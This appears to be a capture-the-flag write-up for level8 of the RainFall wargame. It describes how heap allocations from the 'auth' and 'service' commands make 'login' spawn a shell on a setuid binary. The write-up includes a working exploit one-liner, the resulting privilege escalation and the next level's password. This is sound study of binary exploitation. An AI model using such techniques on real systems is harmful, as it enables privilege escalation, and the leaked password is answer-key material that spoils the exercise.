@@ -1,0 +1,43 @@
+There is a setuid binary "level8" own by level9
+
+After disassembling the binary we can see that main() function
+call system() with "/bin/sh"
+
+The fonction read user input via fgets but with more bytes than buffer size
+So we can do a Buffer Overflow Attack.
+
+The program accept either "auth ", "reset", "service", "login" as input command
+and perform action based on it
+
+The goal is in the "login" command when `auth[8] != 0`
+
+So we need to run "auth " command to malloc the int pointer auth
+
+auth is a int ptr so auth[8] point to 32Bytes after auth address
+
+we can trigger another malloc with "service" command as it call strdup()
+on a buffer that we control via Buffer Overflow.
+
+We just need to allocate more Bytes to fill the 32nd Bytes after auth address with non-zero data
+
+Call the command "service" with more data
+since the program print auth and service address we can see that malloc are aligned every 16Bytes
+
+Here a look at memory map
+|-------------------|-----|----------------------------------------------|------|
+|      4 Bytes      |  1  |                   18 Bytes                   |      |
+| int         *auth |  2  | char                                *service |      |
+|-------------------|  B  |----------------------------------------------|------|
+|      4 Bytes      |  y  | 4 Bytes | 4 Bytes | 4 Bytes | 4 Bytes |   4 Bytes   |
+|      auth[0]      |  t  | auth[4] | auth[5] | auth[6] | auth[7] |   auth[8]   |
+|                   |  e  |         |         |         |         |             |
+|         0         |  s  | "####"  | "####"  | "####"  | "####"  | "\n\0" | 00 |
+|-------------------|-----|-----------------------------------------------------|
+
+
+level8@RainFall:~$> (python -c "print 'auth \nservice' + '#'*16 + '\nlogin\n'"; cat) | ./level8
+(nil), (nil)
+0x804a008, (nil)
+0x804a008, 0x804a018
+level9@RainFall:~$> cat ~level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
